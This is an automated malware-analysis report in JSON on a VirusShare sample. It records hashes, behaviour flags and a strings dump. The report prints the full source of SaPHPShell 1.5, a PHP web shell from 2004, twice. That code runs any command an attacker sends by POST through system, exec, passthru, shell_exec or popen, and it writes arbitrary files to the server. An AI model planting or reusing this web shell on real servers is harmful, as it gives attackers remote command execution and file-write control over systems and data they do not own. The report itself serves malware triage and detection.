{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "command": "May run PowerShell commands",
            "exec": "May run an executable file or a system command using Excel 4 Macros",
            "mkdir": "May create a directory",
            "popen": "May run an executable file or a system command on a Mac",
            "system": "May run an executable file or a system command on a Mac",
            "write": "May write to a file"
        },
        "macro": "<?php\n/*\n+--------------------------------------------------------------------------+\n| SaPHPShell Version 1.5                                                   |\n| This script can be create any text files if the directory allow to write |\n| If Safe_mode is turn off, you can execute some system command            |\n| ======================================================================== |\n| Codz by Angel                                                            |\n| (c) 2004 Security Angel Team                                             |\n| http://www.4ngel.net                                                     |\n| ======================================================================== |\n| Web: http://www.4ngel.net                                                |\n| Email: 4ngel@21cn.com                                                    |\n| Date:  July 22st(My mother's birthday), 2004                             |\n+--------------------------------------------------------------------------+\n*/\nerror_reporting(7);\n// \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd register_globals = off \ufffd\u013b\ufffd\ufffd\ufffd\ufffd\u00b9\ufffd\ufffd\ufffd\nif ( function_exists('ini_get') ) {\n\t$onoff = ini_get('register_globals');\n} else {\n\t$onoff = get_cfg_var('register_globals');\n}\nif ($onoff != 1) {\n\t@extract($_POST, EXTR_SKIP);\n}\n\n// \u0225\ufffd\ufffd\u05ea\ufffd\ufffd\ufffd\u05b7\ufffd\n// \ufffd\ufffd\ufffd\u053d\ufffd\ufffdmagic_quotes_gpc\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\nfunction stripslashes_array(&$array) {\n\twhile (list($key,$var) = each($array)) {\n\t\tif ($key != 'argc' && $key != 'argv' && (strtoupper($key) != $key || ''.intval($key) == \"$key\")) {\n\t\t\tif (is_string($var)) {\n\t\t\t\t$array[$key] = stripslashes($var);\n\t\t\t}\n\t\t\tif (is_array($var))  {\n\t\t\t\t$array[$key] = stripslashes_array($var);\n\t\t\t}\n\t\t}\n\t}\n\treturn $array;\n}\n\n// \ufffd\u0436\ufffd\u013f\u00bc\u0228\ufffd\ufffd\nfunction dir_writeable($dir) {\n\tif (!is_dir($dir)) {\n\t\t@mkdir($dir, 0777);\n\t}\n\tif(is_dir($dir)) {\n\t\tif ($fp = @fopen(\"$dir/test.test\", 'w')) {\n\t\t\t@fclose($fp);\n\t\t\t@unlink(\"$dir/test.test\");\n\t\t\t$writeable = 1;\n\t\t} else {\n\t\t\t$writeable = 0;\n\t\t}\n\t}\n\treturn $writeable;\n}\n\n// \ufffd\u0436\ufffd magic_quotes_gpc \u05f4\u032c\nif (get_magic_quotes_gpc()) {\n    $_POST = stripslashes_array($_POST);\n}\n\n// \ufffd\u0436\ufffd\u013f\u00bc\u0228\ufffd\ufffd\nif (dir_writeable(str_replace('\\\\','/',dirname(__FILE__)))) {\n\t$dir_writeable = '\ufffd\ufffd\u0434';\n} else {\n\t$dir_writeable = '\ufffd\ufffd\ufffd\ufffd\u0434';\n}\n\n// \u05b4\ufffd\u0432\ufffd\ufffd\ufffd\nif ($_POST['action']==\"create\") {\n\tif (file_exists($_POST['filename'])) {\n\t\techo \"<script>alert(\\\"\ufffd\u013c\ufffd\ufffd\u0474\ufffd\ufffd\ufffd\\\")</script>\";\n\t\techo \"<meta http-equiv=\\\"refresh\\\" content=\\\"0;URL=\".$_SERVER['PHP_SELF'].\"\\\">\";\n\t\texit;\n\t} else {\n\t\t$fp=@fopen(\"\".$_POST['filename'].\"\",\"wb\");\n\t\t$content = $_POST['filedate'];\n\t\t$fw=@fwrite($fp,$content);\n\t\tif ($fw) {\n\t\t\techo \"<script>alert(\\\"\u0434\ufffd\ufffd\ufffd\u013c\ufffd\ufffd\u0279\ufffd\ufffd\ufffd\\\")</script>\";\n\t\t} else {\n\t\t\techo \"<script>alert(\\\"\u0434\ufffd\ufffd\ufffd\u013c\ufffd\u02a7\ufffd\u0723\ufffd\\\")</script>\";\n\t\t}\n\t\t@fclose($fp);\n\t}\n}\n?>\n<html>\n<head><title>SaPHPShell Version 1.0</title>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\";>\n<STYLE type=\"text/css\">\nbody {font-family: \"Courier New\", \"Verdana\", \"Tahoma\"; font-size: 12px;}\ntd {font-family: \"Courier New\", \"Verdana\", \"Tahoma\"; font-size: 12px;}\ninput {font-family: \"Courier New\", \"Verdana\", \"Tahoma\";font-size: 12px;}\n.title {font-family: \"Verdana\", \"Tahoma\";font-size: 22px;font-weight: bold;}\ntextarea {font-family: \"Courier New\", \"Verdana\", \"Tahoma\";font-size: 12px;}\n</STYLE>\n</head>\n<body>\n<table width=\"100%\" border=\"0\" cellspacing=\"1\" cellpadding=\"3\">\n  <tr>\n    <td class=\"title\">SaPHPShell</td>\n    <td align=\"right\" valign=\"bottom\"><font color=\"#FF0000\"><?php echo \"\ufffd\ufffd\u01f0\ufffd\ufffd\ufffd\ufffd\u03f5\u0373: \".PHP_OS.\"<br>\";?></font></td>\n  </tr>\n</table>\n<hr>\n<?php\nif (!get_cfg_var(\"safe_mode\")){\n?>\n\t<table width=\"100%\" border=\"0\" cellspacing=\"1\" cellpadding=\"3\">\n\t <form action=\"<?=$PHP_SELF?>\" method=\"post\">\n\t  <tr>\n\t   <td>\u0461\ufffd\ufffd\u05b4\ufffd\u043a\ufffd\ufffd\ufffd:</td>\n\t  </tr>\n\t  <tr>\n\t   <td><select name=\"execfunc\" class=\"input\">\n\t\t<option value=\"system\" <? if ($execfunc==\"system\") { echo \"selected\"; } ?>>system</option>\n\t\t<option value=\"passthru\" <? if ($execfunc==\"passthru\") { echo \"selected\"; } ?>>passthru</option>\n\t\t<option value=\"exec\" <? if ($execfunc==\"exec\") { echo \"selected\"; } ?>>exec</option>\n\t\t<option value=\"shell_exec\" <? if ($execfunc==\"shell_exec\") { echo \"selected\"; } ?>>shell_exec</option>\n\t\t<option value=\"popen\" <? if ($execfunc==\"popen\") { echo \"selected\"; } ?>>popen</option>\n\t  </select></td>\n\t  </tr>\n\t  <tr>\n\t   <td>\ufffd\ufffd\ufffd\ufffd:</td>\n\t  </tr>\n\t  <tr>\n\t   <td><input type=\"text\" name=\"command\" size=\"60\" value=\"<?=$_POST['command']?>\">\n      <input type=\"submit\" value=\"execute\"> \u05e2\ufffd\u28fa\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</td>\n\t  </tr>\n\t  <tr>\n\t   <td>\ufffd\ufffd\ufffd:</td>\n\t  </tr>\n\t  <tr>\n\t   <td><textarea name=\"textarea\" cols=\"100\" rows=\"25\" readonly><?php\n\tif (!empty($_POST['command'])) {\n\t\tif ($execfunc==\"system\") {\n\t\t\tsystem($_POST['command']);\n\t\t} elseif ($execfunc==\"passthru\") {\n\t\t\tpassthru($_POST['command']);\n\t\t} elseif ($execfunc==\"exec\") {\n\t\t\t$result = exec($_POST['command']);\n\t\t\techo $result;\n\t\t} elseif ($execfunc==\"shell_exec\") {\n\t\t\t$result=shell_exec($_POST['command']);\n\t\t\techo $result;\t\n\t\t} elseif ($execfunc==\"popen\") {\n\t\t\t$pp = popen($_POST['command'], 'r');\n\t\t\t$read = fread($pp, 2096);\n\t\t\techo $read;\n\t\t\tpclose($pp);\n\t\t} else {\n\t\t\tsystem($_POST['command']);\n\t\t}\n\t}\n\t?></textarea></td>\n\t  </tr>\n\t</form>\n   </table>\n\t<hr>\n<?php\n}\n?>\n<table width=\"100%\" border=\"0\" cellspacing=\"1\" cellpadding=\"3\">\n <form action=\"<?=$PHP_SELF?>\" method=\"post\">\n  <tr>\n    <td>\ufffd\ufffd\u01f0\u013f\u00bc\ufffd\ufffd<font color=\"#ff0000\"><?=$dir_writeable?></font>\ufffd\ufffd:\n    <?=str_replace('\\\\','/',dirname(__FILE__))?>\n\t</td>\n  </tr>\n  <tr>\n    <td>&nbsp;</td>\n  </tr>\n  <tr>\n    <td>\ufffd\ufffd\ufffd\ubf6b\u04aa\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u013c\ufffd\ufffd\ufffd\ufffd\ufffd\u05a7\ufffd\ufffd\ufffd\ufffd\ufffd\u00b7\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u00b7\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u00b7\ufffd\ufffd\ufffd\uda86\udcf4\ufffd\ufffd\u06b5\ufffd\u01f0\u013f\u00bc\ufffd\ufffd</td>\n  </tr>\n  <tr>\n    <td><input type=\"text\" name=\"filename\" size=\"60\"></td>\n  </tr>\n  <tr>\n    <td>\ufffd\u013c\ufffd\ufffd\ufffd\ufffd\ufffd:</td>\n  </tr>\n  <tr>\n    <td><textarea name=\"filedate\" cols=\"80\" rows=\"15\"></textarea></td>\n  </tr>\n  <tr>\n    <td><input type=\"hidden\" name=\"action\" value=\"create\">\n      <input name=\"submit\" type=\"submit\" value=\"\ufffd\ufffd\ufffd\ufffd\">\n</td>\n  </tr>\n </form>\n</table>\n<hr>\n<i>Copyright (C) 2004 Security Angel Team [S4T] All Rights Reserved. Get the latest version at <a\nhref=\"http://www.4ngel.net\" target=\"_blank\">www.4ngel.net</a>.<br>\nPowered by SaPHPShell Version 1.5</i>\n</body>\n</html>"
    },
    "filename": "VirusShare_23fc0de1291fe51b1d50fdc536f57b2f",
    "filesize": 6327,
    "filetype": "PHP script, ISO-8859 text, with CRLF line terminators",
    "hashes": {
        "md5": "23fc0de1291fe51b1d50fdc536f57b2f",
        "sha1": "9e90b30f9100c4f76315a6502b059b1bff892819",
        "sha256": "3159ff4a167cb4d66c0dfd2b57f25f699a2df236f6d05657a507a52d530992ec"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "<?php",
            "+--------------------------------------------------------------------------+",
            "| SaPHPShell Version 1.5                                                   |",
            "| This script can be create any text files if the directory allow to write |",
            "| If Safe_mode is turn off, you can execute some system command            |",
            "| ======================================================================== |",
            "| Codz by Angel                                                            |",
            "| (c) 2004 Security Angel Team                                             |",
            "| http://www.4ngel.net                                                     |",
            "| ======================================================================== |",
            "| Web: http://www.4ngel.net                                                |",
            "| Email: 4ngel@21cn.com                                                    |",
            "| Date:  July 22st(My mother's birthday), 2004                             |",
            "+--------------------------------------------------------------------------+",
            "error_reporting(7);",
            "//  register_globals = off \u013b",
            "if ( function_exists('ini_get') ) {",
            "\t$onoff = ini_get('register_globals');",
            "} else {",
            "\t$onoff = get_cfg_var('register_globals');",
            "if ($onoff != 1) {",
            "\t@extract($_POST, EXTR_SKIP);",
            "// \u0225\u05ea\u05b7",
            "// \u053dmagic_quotes_gpc",
            "function stripslashes_array(&$array) {",
            "\twhile (list($key,$var) = each($array)) {",
            "\t\tif ($key != 'argc' && $key != 'argv' && (strtoupper($key) != $key || ''.intval($key) == \"$key\")) {",
            "\t\t\tif (is_string($var)) {",
            "\t\t\t\t$array[$key] = stripslashes($var);",
            "\t\t\t}",
            "\t\t\tif (is_array($var))  {",
            "\t\t\t\t$array[$key] = stripslashes_array($var);",
            "\t\t\t}",
            "\treturn $array;",
            "// \u0436\u013f",
            "function dir_writeable($dir) {",
            "\tif (!is_dir($dir)) {",
            "\t\t@mkdir($dir, 0777);",
            "\tif(is_dir($dir)) {",
            "\t\tif ($fp = @fopen(\"$dir/test.test\", 'w')) {",
            "\t\t\t@fclose($fp);",
            "\t\t\t@unlink(\"$dir/test.test\");",
            "\t\t\t$writeable = 1;",
            "\t\t} else {",
            "\t\t\t$writeable = 0;",
            "\treturn $writeable;",
            "// \u0436 magic_quotes_gpc \u05f4\u032c",
            "if (get_magic_quotes_gpc()) {",
            "    $_POST = stripslashes_array($_POST);",
            "// \u0436\u013f",
            "if (dir_writeable(str_replace('\\\\','/',dirname(__FILE__)))) {",
            "\t$dir_writeable = '\u0434';",
            "} else {",
            "\t$dir_writeable = '\u0434';",
            "// \u05b4\u0432",
            "if ($_POST['action']==\"create\") {",
            "\tif (file_exists($_POST['filename'])) {",
            "\t\techo \"<script>alert(\\\"\u013c\u0474\\\")</script>\";",
            "\t\techo \"<meta http-equiv=\\\"refresh\\\" content=\\\"0;URL=\".$_SERVER['PHP_SELF'].\"\\\">\";",
            "\t\texit;",
            "\t} else {",
            "\t\t$fp=@fopen(\"\".$_POST['filename'].\"\",\"wb\");",
            "\t\t$content = $_POST['filedate'];",
            "\t\t$fw=@fwrite($fp,$content);",
            "\t\tif ($fw) {",
            "\t\t\techo \"<script>alert(\\\"\u0434\u013c\u0279\\\")</script>\";",
            "\t\t} else {",
            "\t\t\techo \"<script>alert(\\\"\u0434\u013c\u02a7\u0723\\\")</script>\";",
            "\t\t@fclose($fp);",
            "<html>",
            "<head><title>SaPHPShell Version 1.0</title>",
            "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\";>",
            "<STYLE type=\"text/css\">",
            "body {font-family: \"Courier New\", \"Verdana\", \"Tahoma\"; font-size: 12px;}",
            "td {font-family: \"Courier New\", \"Verdana\", \"Tahoma\"; font-size: 12px;}",
            "input {font-family: \"Courier New\", \"Verdana\", \"Tahoma\";font-size: 12px;}",
            ".title {font-family: \"Verdana\", \"Tahoma\";font-size: 22px;font-weight: bold;}",
            "textarea {font-family: \"Courier New\", \"Verdana\", \"Tahoma\";font-size: 12px;}",
            "</STYLE>",
            "</head>",
            "<body>",
            "<table width=\"100%\" border=\"0\" cellspacing=\"1\" cellpadding=\"3\">",
            "  <tr>",
            "    <td class=\"title\">SaPHPShell</td>",
            "    <td align=\"right\" valign=\"bottom\"><font color=\"#FF0000\"><?php echo \"\u01f0\u03f5\u0373: \".PHP_OS.\"<br>\";?></font></td>",
            "  </tr>",
            "</table>",
            "<hr>",
            "<?php",
            "if (!get_cfg_var(\"safe_mode\")){",
            "\t<table width=\"100%\" border=\"0\" cellspacing=\"1\" cellpadding=\"3\">",
            "\t <form action=\"<?=$PHP_SELF?>\" method=\"post\">",
            "\t  <tr>",
            "\t   <td>\u0461\u05b4\u043a:</td>",
            "\t  </tr>",
            "\t  <tr>",
            "\t   <td><select name=\"execfunc\" class=\"input\">",
            "\t\t<option value=\"system\" <? if ($execfunc==\"system\") { echo \"selected\"; } ?>>system</option>",
            "\t\t<option value=\"passthru\" <? if ($execfunc==\"passthru\") { echo \"selected\"; } ?>>passthru</option>",
            "\t\t<option value=\"exec\" <? if ($execfunc==\"exec\") { echo \"selected\"; } ?>>exec</option>",
            "\t\t<option value=\"shell_exec\" <? if ($execfunc==\"shell_exec\") { echo \"selected\"; } ?>>shell_exec</option>",
            "\t\t<option value=\"popen\" <? if ($execfunc==\"popen\") { echo \"selected\"; } ?>>popen</option>",
            "\t  </select></td>",
            "\t  </tr>",
            "\t  <tr>",
            "\t   <td>:</td>",
            "\t  </tr>",
            "\t  <tr>",
            "\t   <td><input type=\"text\" name=\"command\" size=\"60\" value=\"<?=$_POST['command']?>\">",
            "      <input type=\"submit\" value=\"execute\"> \u05e2\u28fa</td>",
            "\t  </tr>",
            "\t  <tr>",
            "\t   <td>:</td>",
            "\t  </tr>",
            "\t  <tr>",
            "\t   <td><textarea name=\"textarea\" cols=\"100\" rows=\"25\" readonly><?php",
            "\tif (!empty($_POST['command'])) {",
            "\t\tif ($execfunc==\"system\") {",
            "\t\t\tsystem($_POST['command']);",
            "\t\t} elseif ($execfunc==\"passthru\") {",
            "\t\t\tpassthru($_POST['command']);",
            "\t\t} elseif ($execfunc==\"exec\") {",
            "\t\t\t$result = exec($_POST['command']);",
            "\t\t\techo $result;",
            "\t\t} elseif ($execfunc==\"shell_exec\") {",
            "\t\t\t$result=shell_exec($_POST['command']);",
            "\t\t\techo $result;\t",
            "\t\t} elseif ($execfunc==\"popen\") {",
            "\t\t\t$pp = popen($_POST['command'], 'r');",
            "\t\t\t$read = fread($pp, 2096);",
            "\t\t\techo $read;",
            "\t\t\tpclose($pp);",
            "\t\t} else {",
            "\t\t\tsystem($_POST['command']);",
            "\t?></textarea></td>",
            "\t  </tr>",
            "\t</form>",
            "   </table>",
            "\t<hr>",
            "<?php",
            "<table width=\"100%\" border=\"0\" cellspacing=\"1\" cellpadding=\"3\">",
            " <form action=\"<?=$PHP_SELF?>\" method=\"post\">",
            "  <tr>",
            "    <td>\u01f0\u013f",
            "<font color=\"#ff0000\"><?=$dir_writeable?></font>:",
            "    <?=str_replace('\\\\','/',dirname(__FILE__))?>",
            "\t</td>",
            "  </tr>",
            "  <tr>",
            "    <td>&nbsp;</td>",
            "  </tr>",
            "  <tr>",
            "    <td>\ubf6b\u04aa\u013c\u05a7",
            "\uda86\udcf4\u06b5\u01f0\u013f",
            "</td>",
            "  </tr>",
            "  <tr>",
            "    <td><input type=\"text\" name=\"filename\" size=\"60\"></td>",
            "  </tr>",
            "  <tr>",
            "    <td>\u013c:</td>",
            "  </tr>",
            "  <tr>",
            "    <td><textarea name=\"filedate\" cols=\"80\" rows=\"15\"></textarea></td>",
            "  </tr>",
            "  <tr>",
            "    <td><input type=\"hidden\" name=\"action\" value=\"create\">",
            "      <input name=\"submit\" type=\"submit\" value=\"\">",
            "</td>",
            "  </tr>",
            " </form>",
            "</table>",
            "<hr>",
            "<i>Copyright (C) 2004 Security Angel Team [S4T] All Rights Reserved. Get the latest version at <a",
            "href=\"http://www.4ngel.net\" target=\"_blank\">www.4ngel.net</a>.<br>",
            "Powered by SaPHPShell Version 1.5</i>",
            "</body>",
            "</html>"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://www.4ngel.net"
        ]
    },
    "time": "0:00:00.290896",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
